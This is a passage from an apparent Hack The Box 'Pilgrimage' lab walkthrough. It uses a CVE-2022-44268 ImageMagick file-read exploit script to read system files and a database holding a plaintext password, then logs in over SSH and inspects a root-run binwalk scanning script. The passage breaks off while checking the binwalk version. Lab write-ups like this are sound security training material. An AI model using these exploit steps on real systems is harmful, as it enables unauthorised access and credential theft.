<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/hosts"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
<span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
<span class="mf">127.0.1.1</span>   <span class="n">pilgrimage</span> <span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span>

<span class="c1"># The following lines are desirable for IPv6 capable hosts</span>
<span class="p">::</span><span class="mi">1</span>     <span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span> <span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">1</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="n">ff02</span><span class="p">::</span><span class="mi">2</span> <span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>
</pre></div>

This is more comfortable, so let's enumerate the file system. Firstly, I enumerated all potential users on the system:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/passwd"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"sh$"</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">emily</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">emily</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">emily</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>

I found the <code>root</code> and <code>emily</code> users with shells, so I attempted to read the <code>id_rsa</code> file of the <code>emily</code> user. If successful, gaining access to the <code>id_rsa</code> file of the <code>emily</code> user could allow us to gain system-level access through the SSH service as <code>emily</code>.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/home/emily/.ssh/id_rsa"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
</pre></div>

It did not work, so I believe we don't have access to the <code>id_rsa</code> file, or it doesn't exist.<br/><br/>
After enumerating all interesting files, I recalled the presence of the <code>pilgrimage</code> database, the location of which was leaked in the website source code. I've tried to read its content:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/var/db/pilgrimage"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/HTB/Pilgrimage/content/CVE-2022-44268/CVE-2022-44268.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">59</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
    <span class="n">main</span><span class="p">()</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/HTB/Pilgrimage/content/CVE-2022-44268/CVE-2022-44268.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">41</span><span class="p">,</span> <span class="ow">in</span> <span class="n">main</span>
    <span class="n">uploadMaliciousImage</span><span class="p">()</span>
  <span class="n">File</span> <span class="s2">"/home/elswix/Desktop/elswix/HTB/Pilgrimage/content/CVE-2022-44268/CVE-2022-44268.py"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">23</span><span class="p">,</span> <span class="ow">in</span> <span class="n">uploadMaliciousImage</span>
    <span class="n">decrypted_profile_type</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">raw_profile_type_stipped</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>
                             <span class="o">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
<span class="ne">UnicodeDecodeError</span><span class="p">:</span> <span class="s1">'utf-8'</span> <span class="n">codec</span> <span class="n">can</span><span class="s1">'t decode byte 0x91 in position 99: invalid start byte</span>
</pre></div>

It does exist; however, this error is due to the database file being a binary file, making its content unreliable.<br/><br/>
To download this file, I only modified the upload function of the Python script:<br/><br/>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">uploadMaliciousImage</span><span class="p">():</span>

        <span class="n">upload_url</span> <span class="o">=</span> <span class="s2">"http://pilgrimage.htb/index.php"</span>
        <span class="n">fileToUpload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'toConvert'</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)}</span> 
        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">fileToUpload</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
        <span class="n">newImageUrl</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">'Location'</span><span class="p">]</span>
        <span class="n">regex</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'message=(.*?)&amp;'</span>
        <span class="n">newImageUrl</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">newImageUrl</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>


        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">newImageUrl</span><span class="p">)</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>

        <span class="c1"># Extract the raw profile type from the image metadata</span>
        <span class="n">raw_profile_type</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'Raw profile type'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)[</span><span class="mi">3</span><span class="p">:]</span>
        <span class="n">raw_profile_type_stipped</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">raw_profile_type</span><span class="p">)</span>

        <span class="c1"># Decrypt the raw profile type from hex format</span>
        <span class="c1">#decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8')</span>

        <span class="c1"># Print the decrypted profile type</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">raw_profile_type_stipped</span><span class="p">)</span>
</pre></div>

Now, upon reading this file, we will retrieve the file content in hex format. I will then save the file content into a new file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/var/db/pilgrimage"</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span> <span class="o">&gt;</span> <span class="n">pilgrimage</span>
</pre></div>

The file content in hex format has been saved in the <code>pilgrimage</code> file. Now, we need to change its format:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">pilgrimage</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span> <span class="o">-</span><span class="n">r</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">pilgrimage</span>
</pre></div>

Now, when listing the file type of the <code>pilgrimage</code> file, we obtain the following output<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">file</span> <span class="n">pilgrimage</span>
<span class="n">pilgrimage</span><span class="p">:</span> <span class="n">SQLite</span> <span class="mf">3.</span><span class="n">x</span> <span class="n">database</span><span class="p">,</span> <span class="n">last</span> <span class="n">written</span> <span class="n">using</span> <span class="n">SQLite</span> <span class="n">version</span> <span class="mi">3034001</span><span class="p">,</span> <span class="n">file</span> <span class="n">counter</span> <span class="mi">80</span><span class="p">,</span> <span class="n">database</span> <span class="n">pages</span> <span class="mi">5</span><span class="p">,</span> <span class="n">cookie</span> <span class="mh">0x4</span><span class="p">,</span> <span class="n">schema</span> <span class="mi">4</span><span class="p">,</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">version</span><span class="o">-</span><span class="n">valid</span><span class="o">-</span><span class="k">for</span> <span class="mi">80</span>
</pre></div>

We can obtain this database content using the <code>strings</code> command, but I will still enumerate it using <code>sqlite3</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">sqlite3</span> <span class="o">./</span><span class="n">pilgrimage</span>
<span class="n">SQLite</span> <span class="n">version</span> <span class="mf">3.43.2</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">10</span> <span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">04</span>
<span class="n">Enter</span> <span class="s2">".help"</span> <span class="k">for</span> <span class="n">usage</span> <span class="n">hints</span><span class="o">.</span>
<span class="n">sqlite</span><span class="o">&gt;</span> <span class="o">.</span><span class="n">schema</span>
<span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span> <span class="n">TEXT</span> <span class="n">PRIMARY</span> <span class="n">KEY</span> <span class="n">NOT</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">password</span> <span class="n">TEXT</span> <span class="n">NOT</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">images</span> <span class="p">(</span><span class="n">url</span> <span class="n">TEXT</span> <span class="n">PRIMARY</span> <span class="n">KEY</span> <span class="n">NOT</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">original</span> <span class="n">TEXT</span> <span class="n">NOT</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">username</span> <span class="n">TEXT</span> <span class="n">NOT</span> <span class="n">NULL</span><span class="p">);</span>
<span class="n">sqlite</span><span class="o">&gt;</span>
</pre></div>

There is a table called <code>users</code>. Let's extract its entire content:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">sqlite</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">users</span><span class="p">;</span>
<span class="n">emily</span><span class="o">|</span><span class="n">abigchonkyboi123</span>
<span class="n">sqlite</span><span class="o">&gt;</span>
</pre></div>

These values seem to be credentials for the <code>emily</code> user. Let's try using them to connect through SSH as the <code>emily</code> user:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ssh</span> <span class="n">emily</span><span class="o">@</span><span class="mf">10.10.11.219</span>
<span class="n">emily</span><span class="o">@</span><span class="mf">10.10.11.219</span><span class="s1">'s password: </span>
<span class="n">Linux</span> <span class="n">pilgrimage</span> <span class="mf">5.10.0</span><span class="o">-</span><span class="mi">23</span><span class="o">-</span><span class="n">amd64</span> <span class="c1">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64</span>

<span class="n">The</span> <span class="n">programs</span> <span class="n">included</span> <span class="k">with</span> <span class="n">the</span> <span class="n">Debian</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="n">system</span> <span class="n">are</span> <span class="n">free</span> <span class="n">software</span><span class="p">;</span>
<span class="n">the</span> <span class="n">exact</span> <span class="n">distribution</span> <span class="n">terms</span> <span class="k">for</span> <span class="n">each</span> <span class="n">program</span> <span class="n">are</span> <span class="n">described</span> <span class="ow">in</span> <span class="n">the</span>
<span class="n">individual</span> <span class="n">files</span> <span class="ow">in</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/*/</span><span class="n">copyright</span><span class="o">.</span>

<span class="n">Debian</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="n">comes</span> <span class="k">with</span> <span class="n">ABSOLUTELY</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span>
<span class="n">permitted</span> <span class="n">by</span> <span class="n">applicable</span> <span class="n">law</span><span class="o">.</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

They worked, and we have gained access to the system as the <code>emily</code> user.<br/><br/>
As emily, we are able to read the first flag:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span> 
<span class="mi">8</span><span class="n">fbea</span><span class="o">**********************</span><span class="mi">3</span><span class="n">fa7b</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

The <code>emily</code> user doesn't belong to any interesting group:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">emily</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">emily</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">emily</span><span class="p">)</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

When listing its sudo privileges, we noticed that it doesn't have any.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">emily</span><span class="p">:</span> 
<span class="n">Sorry</span><span class="p">,</span> <span class="n">user</span> <span class="n">emily</span> <span class="n">may</span> <span class="ow">not</span> <span class="n">run</span> <span class="n">sudo</span> <span class="n">on</span> <span class="n">pilgrimage</span><span class="o">.</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Let's attempt to list the <code>Set-UID</code> files in the file system:<br/><br/>
<div class="highlight"><pre><span></span><span class="n">emily</span><span class="nd">@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">su</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">fusermount</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">gpasswd</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">newgrp</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
<span class="n">emily</span><span class="nd">@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

There are also no interesting <code>Set-UID</code> files.<br/><br/>
When looking at the commands executed by the users on the system, I found some interesting ones:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ps</span> <span class="o">-</span><span class="n">eo</span> <span class="n">user</span><span class="p">,</span><span class="n">command</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">"\["</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="s2">"systemd"</span>
<span class="n">USER</span>     <span class="n">COMMAND</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">init</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">VGAuthService</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">vmtoolsd</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">auditd</span>
<span class="n">_laurel</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">laurel</span> <span class="o">--</span><span class="n">config</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">laurel</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">toml</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">dhclient</span> <span class="o">-</span><span class="mi">4</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">pf</span> <span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">dhclient</span><span class="o">.</span><span class="n">eth0</span><span class="o">.</span><span class="n">pid</span> <span class="o">-</span><span class="n">lf</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dhcp</span><span class="o">/</span><span class="n">dhclient</span><span class="o">.</span><span class="n">eth0</span><span class="o">.</span><span class="n">leases</span> <span class="o">-</span><span class="n">I</span> <span class="o">-</span><span class="n">df</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dhcp</span><span class="o">/</span><span class="n">dhclient6</span><span class="o">.</span><span class="n">eth0</span><span class="o">.</span><span class="n">leases</span> <span class="n">eth0</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">cron</span> <span class="o">-</span><span class="n">f</span>
<span class="n">root</span>     <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">malwarescan</span><span class="o">.</span><span class="n">sh</span>
<span class="n">root</span>     <span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">:</span> <span class="n">master</span> <span class="n">process</span> <span class="p">(</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="mf">7.4</span><span class="o">/</span><span class="n">fpm</span><span class="o">/</span><span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="o">.</span><span class="n">conf</span><span class="p">)</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">rsyslogd</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">iNONE</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">inotifywait</span> <span class="o">-</span><span class="n">m</span> <span class="o">-</span><span class="n">e</span> <span class="n">create</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span>
<span class="n">root</span>     <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">malwarescan</span><span class="o">.</span><span class="n">sh</span>
<span class="n">root</span>     <span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">agetty</span> <span class="o">-</span><span class="n">o</span> <span class="o">-</span><span class="n">p</span> <span class="o">--</span> \<span class="n">u</span> <span class="o">--</span><span class="n">noclear</span> <span class="n">tty1</span> <span class="n">linux</span>
<span class="n">root</span>     <span class="n">nginx</span><span class="p">:</span> <span class="n">master</span> <span class="n">process</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nginx</span> <span class="o">-</span><span class="n">g</span> <span class="n">daemon</span> <span class="n">on</span><span class="p">;</span> <span class="n">master_process</span> <span class="n">on</span><span class="p">;</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">nginx</span><span class="p">:</span> <span class="n">worker</span> <span class="n">process</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">nginx</span><span class="p">:</span> <span class="n">worker</span> <span class="n">process</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">:</span> <span class="n">pool</span> <span class="n">www</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">php</span><span class="o">-</span><span class="n">fpm</span><span class="p">:</span> <span class="n">pool</span> <span class="n">www</span>
<span class="n">emily</span>    <span class="p">(</span><span class="n">sd</span><span class="o">-</span><span class="n">pam</span><span class="p">)</span>
<span class="n">emily</span>    <span class="n">sshd</span><span class="p">:</span> <span class="n">emily</span><span class="nd">@pts</span><span class="o">/</span><span class="mi">0</span>
<span class="n">emily</span>    <span class="o">-</span><span class="n">bash</span>
<span class="n">emily</span>    <span class="n">ps</span> <span class="o">-</span><span class="n">eo</span> <span class="n">user</span><span class="p">,</span><span class="n">command</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

The <code>root</code> user, is running a bash script called <code>malwarescan.sh</code>. It is unusual, so let's try to read its content:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">malwarescan</span><span class="o">.</span><span class="n">sh</span>
<span class="c1">#!/bin/bash</span>

<span class="n">blacklist</span><span class="o">=</span><span class="p">(</span><span class="s2">"Executable script"</span> <span class="s2">"Microsoft executable"</span><span class="p">)</span>

<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">inotifywait</span> <span class="o">-</span><span class="n">m</span> <span class="o">-</span><span class="n">e</span> <span class="n">create</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span> <span class="o">|</span> <span class="k">while</span> <span class="n">read</span> <span class="n">FILE</span><span class="p">;</span> <span class="n">do</span>
    <span class="n">filename</span><span class="o">=</span><span class="s2">"/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "</span><span class="err">$</span><span class="n">FILE</span><span class="s2">" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"</span>
    <span class="n">binout</span><span class="o">=</span><span class="s2">"$(/usr/local/bin/binwalk -e "</span><span class="err">$</span><span class="n">filename</span><span class="s2">")"</span>
        <span class="k">for</span> <span class="n">banned</span> <span class="ow">in</span> <span class="s2">"$</span><span class="si">{blacklist[@]}</span><span class="s2">"</span><span class="p">;</span> <span class="n">do</span>
        <span class="k">if</span> <span class="p">[[</span> <span class="s2">"$binout"</span> <span class="o">==</span> <span class="o">*</span><span class="s2">"$banned"</span><span class="o">*</span> <span class="p">]];</span> <span class="n">then</span>
            <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">rm</span> <span class="s2">"$filename"</span>
            <span class="k">break</span>
        <span class="n">fi</span>
    <span class="n">done</span>
<span class="n">done</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

This script is using <code>inotifywait</code> to monitor the directory <code>/var/www/pilgrimage.htb/shrunk/</code> for newly created files. When a file is created, the script gets its full name and uses <code>binwalk</code> to perform a binary signature analysis and extract possible embedded data.<br/><br/>
The script maintains a blacklist (<code>blacklist</code>) that contains phrases associated with executable scripts and Microsoft executable files. If it finds any of these phrases in the <code>binwalk</code> output, it removes the newly created file. The purpose is to filter and eliminate files that may contain unwanted executables or data.<br/><br/>
<h3><br>Shell as root</br></h3><br>
Let's list the version of the <code>binwalk</code> binary:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">binwalk</span>

<span class="n">Binwalk</span> <span class="n">v2</span><span class="mf">.3.2</span>
<span class="n">Craig</span> <span class="n">Heffner</span><span class="p">,</span> <span class="n">ReFirmLabs</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">ReFirmLabs</span><span class="o">/</span><span class="n">binwalk</span>

<span class="n">Usage</span><span class="p">:</span> <span class="n">binwalk</span> <span class="p">[</span><span class="n">OPTIONS</span><span class="p">]</span> <span class="p">[</span><span class="n">FILE1</span><span class="p">]</span> <span class="p">[</span><span class="n">FILE2</span><span class="p">]</span> <span class="p">[</span><span class="n">FILE3</span><span class="p">]</span> <span class="o">...</span>

<span class="n">Signature</span> <span class="n">Scan</span> <span class="n">Options</span><span class="p">:</span>
